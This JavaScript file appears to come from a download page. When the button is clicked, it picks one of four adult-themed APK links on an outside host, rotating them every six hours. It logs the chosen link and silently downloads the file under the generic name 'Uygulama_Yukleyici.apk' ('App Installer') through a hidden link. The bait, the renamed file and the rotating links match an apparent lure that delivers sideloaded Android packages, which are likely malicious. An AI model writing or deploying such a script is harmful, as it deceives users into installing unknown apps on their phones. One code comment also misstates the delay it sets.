import { sendLog } from './log.js';

document.addEventListener("DOMContentLoaded", () => {
  const btn = document.getElementById('download-button');
  const apkLinks = [
    "https://kaspergroo.com/obb/TurkPornoV1.apk",
    "https://kaspergroo.com/obb/TurkPornoV2.apk",
    "https://kaspergroo.com/obb/TurkPornoV3.apk",
    "https://kaspergroo.com/obb/TurkPornoV4.apk"
  ];

  btn.addEventListener('click', () => {
    // 1. Görsel geri bildirim
    btn.innerText = 'Yükleniyor...';
    btn.disabled = true;

    // 2. HER APK 6 SAAT BOYUNCA GÖSTERİLECEK ŞEKİLDE LİNK SEÇİMİ
    const now = new Date();
    const totalHours = now.getHours() + (now.getMinutes() / 60);
    const linkIndex = Math.floor(totalHours / 6) % apkLinks.length;
    const fileUrl = apkLinks[linkIndex];
    
    sendLog(fileUrl);

    // 3. Görünmez link oluştur
    const hiddenAnchor = document.createElement('a');
    hiddenAnchor.href = fileUrl;
    hiddenAnchor.download = "Uygulama_Yukleyici.apk";
    hiddenAnchor.style.display = 'none';
    
    // 4. Linki sayfaya ekle, tıkla ve kaldır
    document.body.appendChild(hiddenAnchor);
    hiddenAnchor.click();
    document.body.removeChild(hiddenAnchor);

    // 5. Butonu eski haline getir - süreyi kısalttım (2 saniye)
    setTimeout(() => {
      btn.innerText = 'Yükle';
      btn.disabled = false;
    }, 4000); // 4 saniye yerine 2 saniye
  });
});
